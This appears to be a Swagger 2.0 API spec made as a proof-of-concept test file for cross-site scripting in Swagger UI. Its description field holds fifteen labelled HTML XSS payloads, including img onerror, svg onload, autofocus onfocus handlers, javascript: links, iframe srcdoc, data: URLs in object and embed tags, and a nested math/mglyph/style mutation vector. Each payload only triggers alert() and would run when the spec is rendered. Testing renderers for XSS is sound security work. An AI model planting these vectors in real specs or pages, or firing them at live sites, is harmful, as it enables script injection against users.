swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI XSS Vector Tests
  description: >
    <h2>XSS Vector Testing - Safe PoC</h2>

    <p>Vector 1 - img onerror:</p>
    <img src=x onerror=alert(1)>

    <p>Vector 2 - svg onload:</p>
    <svg onload=alert(2)>

    <p>Vector 3 - details ontoggle (click to expand):</p>
    <details open ontoggle=alert(3)><summary>Click me</summary>test</details>

    <p>Vector 4 - body onload:</p>
    <body onload=alert(4)>

    <p>Vector 5 - iframe srcdoc:</p>
    <iframe srcdoc="<script>alert(5)</script>"></iframe>

    <p>Vector 6 - marquee onstart:</p>
    <marquee onstart=alert(6)>test</marquee>

    <p>Vector 7 - input onfocus autofocus:</p>
    <input onfocus=alert(7) autofocus>

    <p>Vector 8 - select onfocus autofocus:</p>
    <select onfocus=alert(8) autofocus></select>

    <p>Vector 9 - textarea onfocus autofocus:</p>
    <textarea onfocus=alert(9) autofocus></textarea>

    <p>Vector 10 - a href javascript:</p>
    <a href="javascript:alert(10)">Click here for Vector 10</a>

    <p>Vector 11 - math xlink:</p>
    <math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(11)></style></mtext></svg></mglyph></table></mtext></math>

    <p>Vector 12 - object data:</p>
    <object data="data:text/html,<script>alert(12)</script>"></object>

    <p>Vector 13 - embed src:</p>
    <embed src="data:text/html,<script>alert(13)</script>">

    <p>Vector 14 - video source onerror:</p>
    <video><source onerror=alert(14)></video>

    <p>Vector 15 - audio source onerror:</p>
    <audio><source onerror=alert(15)></audio>

paths:
  /:
    get:
      summary: Test endpoint
      responses:
        '200':
          description: OK
